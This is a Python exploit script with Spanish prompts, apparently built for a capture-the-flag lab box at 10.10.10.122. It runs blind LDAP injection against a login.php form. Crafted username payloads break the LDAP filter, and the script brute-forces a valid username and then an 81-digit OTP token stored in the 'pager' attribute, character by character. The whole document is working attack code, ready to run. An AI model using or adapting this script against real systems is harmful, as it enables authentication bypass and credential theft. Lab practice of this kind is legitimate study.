#!/usr/bin/python3

import requests
import pdb
import time
import string
import sys
import signal
from pwn import *

# ctrl + c
def def_handler(sig,frame):
    print("\n[!] Saliendo...")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.122/login.php"
chars = string.ascii_lowercase
digits = string.digits

# Funciones
def getUser():
    
    p1 = log.progress("Ldap Injection(username)")
    p1.status("Iniciando proceso de fuerza bruta")
    user = ""
    time.sleep(1)

    p2 = log.progress("Nombre:")
    for i in range(0,10):
        for character in chars:
            post_data = {

                'inputUsername' : f"{user}{character}%2a%29%29%29%00",
                'inputOTP' : "1234"
            }
            
            p1.status(f"Probando con {character} en la posición {i}: {post_data['inputUsername']}")
            r = requests.post(main_url, data=post_data)

            if "Cannot login" in r.text:
                user += character
                p2.status(user)
                break

            time.sleep(1)
    
def getOTP():
    
    p1 = log.progress("Ldap Injection(OTP)")
    p1.status("Iniciando proceso de fuerza bruta")
    token = ""
    time.sleep(1)

    p2 = log.progress("Token")
    for position in range(0,81):
        for digit in digits:

            post_data = {
                    'inputUsername' : f'ldapuser%29%28pager%3d{token}{digit}%2a%29%29%29%00',
                    'inputOTP' : '123'
                    }
            
            p1.status(f"Probando con {digit} en la posición {position}: {post_data['inputUsername']}")
            r = requests.post(main_url, data=post_data)

            if "Cannot login" in r.text:
                token += digit
                p2.status(token)
                break
            time.sleep(1)

if __name__ == "__main__":
    
    option = ""

    while option != "0":
        print("\n1) Obtener usuario\n")
        print("2) Obtener token\n")
        print("0) Salir\n")
        option = int(input("> "))
        print("")

        if option == 1:
            getUser()
        elif option == 2:
            getOTP()
        elif option == 0:
            print("Saliendo...")
            sys.exit(0)
        else:
            print("Opción incorrecta")
            continue
